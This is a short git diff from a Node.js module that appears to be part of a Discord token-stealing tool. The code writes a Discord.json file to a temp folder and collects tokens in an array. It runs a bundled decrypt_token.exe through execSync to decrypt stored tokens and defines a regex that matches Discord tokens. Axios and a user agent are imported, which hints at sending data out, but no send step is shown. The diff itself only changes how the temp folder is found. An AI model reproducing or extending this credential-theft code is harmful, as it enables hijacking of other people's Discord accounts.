@@ -3,15 +3,15 @@ const { browsers } = require('../util/variables');
 const { execSync } = require('child_process');
 const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = require('fs');
 const axios = require('axios');
-const { tempFolder } = require('../index');
 const { userAgent } = require('../config');
+const { getTempFolder } = require('../util/init');
 
-const jsonFile = join(tempFolder, 'Discord.json');
+const jsonFile = join(getTempFolder(), 'Discord.json');
 writeFileSync(jsonFile, '{}');
 const tokens = [];
 
 const decryptToken = (token, key) => execSync(
-  join(tempFolder, 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
+  join(getTempFolder(), 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
 ).toString('utf8');
 
 const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
